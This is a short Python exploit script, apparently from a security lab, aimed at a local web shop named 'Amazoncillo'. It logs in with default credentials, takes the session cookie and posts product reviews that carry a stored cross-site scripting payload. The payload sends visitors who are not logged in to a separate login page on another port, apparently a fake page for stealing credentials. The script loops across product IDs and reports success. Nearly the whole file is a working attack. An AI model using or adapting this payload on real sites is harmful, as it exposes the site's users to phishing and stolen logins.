import requests

AMAZONCILLO = 'http://localhost:8888'


def get_jsessionid():
    res = requests.get(AMAZONCILLO)
    set_cookie = res.headers['Set-Cookie']
    jsessionid = set_cookie.split(';')[0].split('=')[1]
    return jsessionid


def login(email, password):
    jsessisonid = get_jsessionid()
    requests.post(
        AMAZONCILLO + '/login',
        data={'email': email, 'password': password, '_rememberMe': 'on'},
        cookies={'JSESSIONID': jsessisonid}
    )

    return jsessisonid


def post_comment(jsessionid, comment, product_id):
    res = requests.post(
        AMAZONCILLO + '/products/' + str(product_id) + '/rate',
        data={'productId': product_id, 'rating': 5, 'text': comment},
        cookies={'JSESSIONID': jsessionid}
    )

    return res


if __name__ == "__main__":
    jsessionid = login('default@default.com', 'default')
    comment = '5/5<script> \
                element = document.getElementById("account-dropdown"); \
                if (!element) { \
                    window.location.href = "http://localhost:5000/login"; \
                } \
              </script>'

    product_id = 1
    while True:
        res = post_comment(jsessionid, comment, product_id)
        if "Internal Error" in res.text:
            print(f"[+] Comment posted on product {product_id}: KO")
            print("[+] Exploit successful")
            break
        else:
            print(f"[+] Comment posted on product {product_id}: OK")
            product_id += 1
